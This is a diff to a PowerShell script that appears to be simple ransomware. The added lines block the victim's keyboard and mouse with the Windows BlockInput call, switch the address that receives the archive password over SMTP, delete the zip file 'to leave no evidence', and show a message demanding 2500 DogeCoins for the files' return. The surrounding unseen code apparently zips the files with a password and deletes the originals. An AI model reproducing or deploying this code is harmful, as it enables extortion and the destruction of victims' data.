@@ -1,3 +1,14 @@
+#Temporarily disable user mouse and keyboard input
+
+$code = @"
+    [DllImport("user32.dll")]
+    public static extern bool BlockInput(bool fBlockIt);
+"@
+
+$userInput = Add-Type -MemberDefinition $code -Name UserInput -Namespace UserInput -PassThru
+
+$userInput::BlockInput($true)
+
 #Install 7zip to zip files
 
 $workdir = "c:\installer\"
@@ -67,11 +78,9 @@ $p = Start-Process $pathTo64Bit7Zip -ArgumentList $arguments -Wait -PassThru -Wi
 
 $del = Remove-Item $Destination -Force -Recurse
 
-
+$email = "ucjmyqhi@pokemail.net"
 
 #Send password for files to your e-mail
-
-$email = "zswyjkom@pokemail.net"
 
 $SMTPServer = "smtp.pokemail.net"
 $Mailer = new-object Net.Mail.SMTPclient($SMTPServer)
@@ -105,6 +114,15 @@ $Msg.Dispose()
 $Mailer.Dispose()
 
 #Delete the zip file (leave no evidence)
-
-#Start-Sleep -s 15
 $del = Remove-Item $ZipFolder -Force -Recurse
+
+#Disable temporary user keyboard and mouse input block
+
+$userInput::BlockInput($false)
+
+#Display a message demanding money
+
+#Add the required .NET assembly for message display
+Add-Type -AssemblyName System.Windows.Forms
+#Show the message
+$result = [System.Windows.Forms.MessageBox]::Show('We have your files!!! We demand 2500 DogeCoins for their return.', '!-Notice-!', 'Ok', 'Warning')
